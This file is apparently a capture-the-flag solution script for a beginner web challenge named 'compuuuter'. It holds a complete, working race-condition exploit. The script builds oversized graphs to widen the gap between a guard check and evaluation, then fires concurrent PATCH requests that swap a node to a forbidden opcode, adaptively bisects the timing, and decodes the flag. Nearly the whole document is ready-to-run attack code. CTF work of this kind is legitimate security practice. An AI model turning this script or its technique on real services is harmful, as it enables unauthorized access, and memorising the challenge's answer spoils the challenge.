#!/usr/bin/env python3
"""
compuuuter (web, beginner) -- TOCTOU race exploit (remote-friendly version).

Vuln chain:
  1) POST /api/graph/<gid>/compute first calls guard() -- "time of check",
     it walks the node list and rejects type 1337.
  2) Then evaluate() reads node["type"] LIVE from the very same dict
     objects -- "time of use" (the code even says so in a comment).
  3) PATCH /api/graph/<gid> does NOT re-check the opcode and edits the
     node dict in place.
  4) Server runs gunicorn -w 1 --threads 8 => our PATCH lands in another
     thread while compute is between check and use.

Remote-friendly bits:
  * persistent keep-alive connections (no TLS handshake on the race PATCH)
  * upload starts small (~1 MB) and halves on transport errors / 413
  * a warmup compute measures server timing to pick the first delay
  * adaptive delay: guard 400 => too early (raise), clean run => too late
    (lower); once bracketed, bisect.

Env overrides: NODES (filler nodes, default 20000), ATTEMPTS (default 15).
Usage: python3 compuuuter_sol.py https://host[:port]/
"""

import http.client
import json
import os
import sys
import threading
import time
from urllib.parse import urlparse

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:3000").rstrip("/")
NODES = int(os.environ.get("NODES", "20000"))   # filler budget (max 100_000)
ATTEMPTS = int(os.environ.get("ATTEMPTS", "15"))
DEPTH = 300                                     # chain depth (recursion-safe)
TARGET_ID = 10 ** 9
BIG = 1 << 200                                  # flag int is way larger

U = urlparse(BASE)
IS_TLS = U.scheme == "https"
HOST = U.netloc


class Api:
    """One keep-alive connection; recreates itself on any transport error."""

    def __init__(self, name):
        self.name = name
        self.c = None

    def connect(self, timeout=30):
        self.close()
        cls = http.client.HTTPSConnection if IS_TLS else http.client.HTTPConnection
        self.c = cls(HOST, timeout=timeout)
        self.c.connect()
        return self

    def close(self):
        if self.c is not None:
            try:
                self.c.close()
            except Exception:
                pass
        self.c = None

    def req(self, method, path, body=None, timeout=60):
        data = json.dumps(body).encode() if body is not None else None
        headers = {"Content-Type": "application/json"} if data else {}
        try:
            if self.c is None:
                self.connect(timeout)
            self.c.request(method, path, body=data, headers=headers)
            resp = self.c.getresponse()
            raw = resp.read()
            try:
                return resp.status, json.loads(raw or b"null")
            except Exception:
                return resp.status, {"error": raw.decode(errors="replace")[:200]}
        except Exception as e:
            self.close()
            return -1, {"error": f"{type(e).__name__}: {e}"}


def build_graph(n_filler):
    """Chains of `add` nodes; each chain head goes FIRST in the list, so its
    first evaluation recurses down the whole chain with a growing frozenset
    `stack` -- O(depth^2) set copying that widens the race window. The target
    node goes LAST: the results loop reads its type after all the fillers."""
    chains = max(1, n_filler // (DEPTH + 1))
    nodes = []
    for c in range(chains):
        base = c * 1000
        nodes.append({"id": base + DEPTH, "type": 2, "args": [base + DEPTH - 1]})
        for d in range(DEPTH - 1):
            nodes.append({"id": base + d + 1, "type": 2, "args": [base + d]})
        nodes.append({"id": base, "type": 1, "value": 0, "args": []})
    nodes.append({"id": TARGET_ID, "type": 1, "value": 0, "args": []})
    return {"nodes": nodes}


def decode_flag(int_str):
    n = int(int_str)
    return n.to_bytes((n.bit_length() + 7) // 8, "little").decode(errors="replace")


def upload(api):
    """Upload with adaptive size: halve the filler budget on transport
    errors or 413/400 rejections (proxies often cap request bodies)."""
    budget = NODES
    while budget >= 2000:
        payload = build_graph(budget)
        size_kb = len(json.dumps(payload)) // 1024
        print(f"[*] uploading graph: ~{len(payload['nodes'])} nodes, {size_kb} KB ...", flush=True)
        st, body = api.req("POST", "/api/graph", payload, timeout=120)
        if st == 200:
            print(f"[+] uploaded: gid={body['id']} ({body['node_count']} nodes)", flush=True)
            return body["id"]
        print(f"[!] upload failed: {st} {str(body)[:140]}", flush=True)
        budget //= 2
        print(f"[*] retrying with budget={budget} ...", flush=True)
    return None


def attempt(gid, delay, c_compute, c_patch):
    box = {}

    def run_compute():
        box["res"] = c_compute.req("POST", f"/api/graph/{gid}/compute", timeout=60)

    t = threading.Thread(target=run_compute, daemon=True)
    t0 = time.perf_counter()
    t.start()
    time.sleep(delay)
    c_patch.req("PATCH", f"/api/graph/{gid}", {"id": TARGET_ID, "type": 1337, "args": []}, timeout=30)
    t.join(timeout=45)
    landed = time.perf_counter() - t0
    # Restore the node so the next attempt can pass guard() again.
    c_patch.req("PATCH", f"/api/graph/{gid}", {"id": TARGET_ID, "type": 1, "value": 0, "args": []}, timeout=30)
    return box.get("res", (0, {})), landed


def main():
    print(f"[*] target: {BASE}", flush=True)

    health = Api("health")
    t0 = time.perf_counter()
    st, body = health.req("GET", "/api/ops", timeout=20)
    rtt = time.perf_counter() - t0
    if st != 200:
        print(f"[!] instance unreachable: {st} {str(body)[:200]}")
        return 1
    print(f"[+] instance is up (GET /api/ops round-trip {rtt*1000:.0f} ms)", flush=True)

    api = Api("main").connect(60)
    gid = upload(api)
    if gid is None:
        print("[!] could not upload any graph -- check the instance/size limits")
        return 1

    # Persistent pre-connected connections for the race itself.
    c_compute = Api("compute").connect(60)
    c_patch = Api("patch").connect(60)

    # Warmup: one clean compute to measure server timing for the first delay.
    t0 = time.perf_counter()
    st, body = c_compute.req("POST", f"/api/graph/{gid}/compute", timeout=60)
    warm = time.perf_counter() - t0
    if st != 200:
        print(f"[!] warmup compute failed: {st} {str(body)[:200]}")
        return 1
    delay = max(0.05, round(warm * 0.35, 3))
    print(f"[+] warmup compute: {warm:.2f}s -> starting delay {delay:.3f}s", flush=True)

    lo, hi = 0.0, None  # too-late bound, too-early bound
    for n in range(1, ATTEMPTS + 1):
        if hi is not None and delay >= hi:
            delay = max(0.02, (lo + hi) / 2)
        (status, body), landed = attempt(gid, delay, c_compute, c_patch)
        if status == 200:
            v = body.get("results", {}).get(str(TARGET_ID))
            if v and int(v) > BIG:
                print(f"[+] race won on attempt {n} (delay={delay:.3f}s)", flush=True)
                flag = decode_flag(v)
                print(f"[+] FLAG: {flag}")
                return 0
            print(f"[-] #{n}: too late (clean {landed:.2f}s)  delay {delay:.3f} ->", end=" ", flush=True)
            lo = max(lo, delay)
            delay = (lo + hi) / 2 if hi is not None else delay / 2
            print(f"{delay:.3f}", flush=True)
        elif status == 400 and "1337" in str(body.get("error", "")):
            print(f"[-] #{n}: too early (guard)      delay {delay:.3f} ->", end=" ", flush=True)
            hi = delay if hi is None else min(hi, delay)
            delay = max(0.02, (lo + hi) / 2 if lo > 0 else delay * 2)
            print(f"{delay:.3f}", flush=True)
        else:
            print(f"[-] #{n}: transport/other ({status}) {str(body)[:120]}", flush=True)
            c_compute.connect(60)
            c_patch.connect(60)
        time.sleep(0.3)
    print("[!] no luck -- rerun with more ATTEMPTS or tweak NODES")
    return 1


if __name__ == "__main__":
    sys.exit(main())
